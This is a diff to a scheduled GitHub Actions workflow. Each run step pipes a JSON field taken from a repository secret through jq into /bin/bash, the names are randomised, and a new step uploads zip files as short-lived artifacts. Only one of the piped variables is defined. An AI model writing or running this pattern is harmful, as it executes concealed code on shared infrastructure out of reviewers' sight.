@@ -1,22 +1,28 @@
 name: xiansongenyuan
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '4 5/6 * * *'
-jobs:  # 24828
+    - cron: '48 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiansongenyuan
         env:
-          zo42508: ${{ secrets.zo42508 }}
+          bjx54001: ${{ secrets.bjx54001 }}
         run: |
-          echo $zo42508 | jq -r .nppa44858 | /bin/bash
-          echo $sdlk1 | jq -r .fjx891 | /bin/bash
-          echo $ujx3 | jq -r .tfp2545 | /bin/bash
-          echo $zh21 | jq -r .e25 | /bin/bash
-          echo $ngdz8 | jq -r .glmri6 | /bin/bash
-          echo $ggj7 | jq -r .otapq1 | /bin/bash
+          printf '%s' "$bjx54001" | jq -r .pde842 | /bin/bash
+          echo $ae27 | jq -r .ljsg002 | /bin/bash
+          printf '%s' "$ufgl78843" | jq -r .fyis053 | /bin/bash
+          echo $rs60960 | jq -r .vt5 | /bin/bash
+          printf '%s' "$yic27" | jq -r .ys12618 | /bin/bash
+          printf '%s' "$os009" | jq -r .ddls0229 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: SclGriQT
+          path: "*.zip"
+          retention-days: 1
